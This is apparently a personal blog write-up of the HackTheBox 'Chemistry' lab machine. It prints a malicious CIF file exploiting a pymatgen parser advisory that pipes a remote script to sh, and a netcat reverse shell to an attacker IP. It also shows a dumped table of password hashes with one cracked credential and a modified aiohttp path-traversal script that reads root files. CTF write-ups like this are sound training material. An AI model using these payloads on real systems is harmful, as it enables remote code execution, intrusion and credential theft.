---
title: Chemistry Writeup
description: Writeup of "Chemistry" machine from Hackthebox
categories: [Writeups, Hackthebox]
tags: [Hackthebox]
image:
  path: /assets/blogimages/Writeups/Hackthebox/Chemistry/ChemistryLOGO.png
  alt: Chemistry Writeup
---

## Enumeration


Let's start with an nmap scan:
 `nmap -Pn -A -p- 10.10.11.38 -v`
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Sat, 08 Mar 2025 15:58:28 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
```

Results reveal two open ports:
- **22/tcp** - OpenSSH 8.2p1 (Ubuntu)
- **5000/tcp** - Werkzeug/3.0.3 (Python 3.9.5)


## Initial Foothold

Upon visiting the web interface at `http://10.10.11.38:5000`, I registered an account and discovered an option to upload `.CIF` files:
![](/assets/blogimages/Writeups/Hackthebox/Chemistry/Chemistry1.png)

Searching online for `.CIF` exploits I find this:
[https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)

Using this information, I crafted a malicious `.CIF` file (`vuln.cif`) that executes a reverse shell:
```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("curl http://10.10.14.245/shell.sh | sh");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

The reverse shell script:
```
#!/usr/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.245 1234 >/tmp/f
```

Hosted `shell.sh` using Python’s HTTP server:<br>
`python3 -m http.server 80`

After uploading `vuln.cif` and clicking "View" I received a reverse shell connection:
![](/assets/blogimages/Writeups/Hackthebox/Chemistry/Chemistry2.png)
![](/assets/blogimages/Writeups/Hackthebox/Chemistry/Chemistry3.png)


To stabilize the shell, I ran:
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

During enumeration, I discovered an SQLite database (`database.db`) in `/home/app/instance`. Extracting its contents reveals user hashes:
```
┌──(root㉿riminux)-[/tmp]
└─# sqlite3 database.db
SQLite version 3.44.0 2023-11-01 11:23:50
Enter ".help" for usage hints.
sqlite> .tables
structure  user     
sqlite> select * from user
   ...> ;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|d|e8cd7da078a86726031ad64f35f5a6c0
16|username|5f4dcc3b5aa765d61d8327deb882cf99
17|had|a1e6cd7f9480f01643245e0b648d9fbe
18|' OR '1'='1|1e54e11980633c7d1fb8a6be99e3e294
19|s4p1emsa|3fc0a7acf087f549ac2b266baf94b8b1
20|123|202cb962ac59075b964b07152d234b70
21|test|098f6bcd4621d373cade4e832627b4f6
22|ich@hier.da|d00d654168ddc74e36cddfc07e5e8f79
23|a|0cc175b9c0f1b6a831c399e269772661
24|password|5f4dcc3b5aa765d61d8327deb882cf99
25|b|92eb5ffee6ae2fec3ad71c777531578f
26|c|4a8a08f09d37b73795649038408b5f33
27|e|e1671797c52e15f763380b45e841ec32
28|za|959848ca10cc8a60da818ac11523dc63
```

The output contained multiple user hashes, but `rosa` stood out as it was the only other system user:
![](/assets/blogimages/Writeups/Hackthebox/Chemistry/Chemistry4.png)


I cracked `rosa`'s password using CrackStation, revealing the credentials:
![](/assets/blogimages/Writeups/Hackthebox/Chemistry/Chemistry5.png)
`rosa:unicorniosrosados`

Using these, I logged in via SSH as `rosa` and retrieved the user flag.

## Privilege Escalation

Using `ss -ltn`, I discovered a web application running on port `8080`. Additionally, the `/opt` directory contained files owned by `root`, suggesting an internal service:
![](/assets/blogimages/Writeups/Hackthebox/Chemistry/Chemistry6.png)
![](/assets/blogimages/Writeups/Hackthebox/Chemistry/Chemistry7.png)

I curl it:<br>
`curl 127.0.0.1:8080`
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Monitoring</title>
    <link rel="stylesheet" href="/assets/css/all.min.css">
    <script src="/assets/js/jquery-3.6.0.min.js"></script>
    <script src="/assets/js/chart.js"></script>
    <link rel="stylesheet" href="/assets/css/style.css">
    <style>
    h2 {
      color: black;
      font-style: italic;
    }

    </style>
</head>
<body>
    <nav class="navbar">
        <div class="container">
            <h1 class="logo"><i class="fas fa-chart-line"></i> Site Monitoring</h1>
            <ul class="nav-links">
                <li><a href="#" id="home"><i class="fas fa-home"></i> Home</a></li>
                <li><a href="#" id="start-service"><i class="fas fa-play"></i> Start Service</a></li>
                <li><a href="#" id="stop-service"><i class="fas fa-stop"></i> Stop Service</a></li>
                <li><a href="#" id="list-services"><i class="fas fa-list"></i> List Services</a></li>
                <li><a href="#" id="check-attacks"><i class="fas fa-exclamation-triangle"></i> Check Attacks</a></li>
            </ul>
        </div>
    </nav>

    <div class="container">
        <div id="earnings">
            <h2>2023 Earnings</h2>
            <canvas id="earningsChart"></canvas>
        </div>
        <div id="views">
            <h2>Views per Month</h2>
            <canvas id="viewsChart"></canvas>
        </div>
        <div id="ad-clicks">
            <h2>Ad Clicks per Visit</h2>
            <canvas id="adClicksChart"></canvas>
        </div>
        <div id="service-list" style="display:none;">
            <h2>Service List</h2>
            <ul id="service-list-content">
                <!-- Will be filled dynamically with JavaScript -->
            </ul>
        </div>
        <div id="attack-logs" style="display:none;">
            <h2>Possible Attacks</h2>
            <h3><p style="color:red;">Functionality currently under development</p></h3>
            <ul id="attack-logs-content">
            </ul>
        </div>
        <div class="loader" id="loader" style="display:none;">Loading...</div>
    </div>

    <script src="/assets/js/script.js"></script>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const earnings = {"April": 3000, "August": 5000, "February": 2000, "January": 1500, "July": 4500, "June": 4000, "March": 2500, "May": 3500, "September": 5500};
            const views = {"April": 40000, "August": 60000, "February": 30000, "January": 25000, "July": 55000, "June": 50000, "March": 35000, "May": 45000, "September": 65000};
            const adClicks = {"Ad1": 650, "Ad2": 200, "Ad3": 1000};

            // Earnings Chart Configuration
            const earningsCtx = document.getElementById('earningsChart').getContext('2d');
            const earningsChart = new Chart(earningsCtx, {
                type: 'bar',
                data: {
                    labels: Object.keys(earnings),
                    datasets: [{
                        label: 'Earnings ($)',
                        data: Object.values(earnings),
                        backgroundColor: 'rgba(75, 192, 192, 0.2)',
                        borderColor: 'rgba(75, 192, 192, 1)',
                        borderWidth: 1
                    }]
                },
                options: {
                    responsive: true,
                    scales: {
                        y: {
                            beginAtZero: true
                        }
                    }
                }
            });

            // Views Chart Configuration
            const viewsCtx = document.getElementById('viewsChart').getContext('2d');
            const viewsChart = new Chart(viewsCtx, {
                type: 'line',
                data: {
                    labels: Object.keys(views),
                    datasets: [{
                        label: 'Views',
                        data: Object.values(views),
                        backgroundColor: 'rgba(153, 102, 255, 0.2)',
                        borderColor: 'rgba(153, 102, 255, 1)',
                        borderWidth: 1
                    }]
                },
                options: {
                    responsive: true,
                    scales: {
                        y: {
                            beginAtZero: true
                        }
                    }
                }
            });

            // Ad Clicks Chart Configuration
            const adClicksCtx = document.getElementById('adClicksChart').getContext('2d');
            const adClicksChart = new Chart(adClicksCtx, {
                type: 'pie',
                data: {
                    labels: Object.keys(adClicks),
                    datasets: [{
                        label: 'Clicks',
                        data: Object.values(adClicks),
                        backgroundColor: [
                            'rgba(255, 99, 132, 0.2)',
                            'rgba(54, 162, 235, 0.2)',
                            'rgba(255, 206, 86, 0.2)',
                            'rgba(75, 192, 192, 0.2)',
                            'rgba(153, 102, 255, 0.2)',
                            'rgba(255, 159, 64, 0.2)'
                        ],
                        borderColor: [
                            'rgba(255, 99, 132, 1)',
                            'rgba(54, 162, 235, 1)',
                            'rgba(255, 206, 86, 1)',
                            'rgba(75, 192, 192, 1)',
                            'rgba(153, 102, 255, 1)',
                            'rgba(255, 159, 64, 1)'
                        ],
                        borderWidth: 1
                    }]
                },
                options: {
                    responsive: true
                }
            });
        });
    </script>
</body>
```

Since the application was locally hosted, I set up SSH port forwarding to access it from my machine:<br>
`ssh -L 8085:localhost:8080 rosa@10.10.11.38`


Now, I could interact with the app at `http://localhost:8085`.
![](/assets/blogimages/Writeups/Hackthebox/Chemistry/Chemistry8.png)


Running `dirsearch` uncovers additional directories:<br>
`dirsearch -u http://localhost:8085/`
![](/assets/blogimages/Writeups/Hackthebox/Chemistry/Chemistry9.png)

Using `whatweb`, we fingerprint the application:
```
┌──(root㉿riminux)-[/tmp]
└─# whatweb -a 3 http://localhost:8085
http://localhost:8085 [200 OK] HTML5, HTTPServer[Python/3.9 aiohttp/3.9.1], IP[::1], JQuery[3.6.0], Script, Title[Site Monitoring]
```
This revealed that the application was running **Python/3.9 with aiohttp/3.9.1**.


Upon searching for vulnerabilities, I found an exploit for `aiohttp`:<br>
[https://github.com/z3rObyte/CVE-2024-23334-PoC](https://github.com/z3rObyte/CVE-2024-23334-PoC)

I modified the exploit to attempt **path traversal** and access `root.txt`:
```
#!/bin/bash

url="http://localhost:8085"
string="../"
payload="/assets/"
file="root/root.txt" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

Executing the script successfully retrieved `root.txt`:
![](/assets/blogimages/Writeups/Hackthebox/Chemistry/Chemistry10.png)


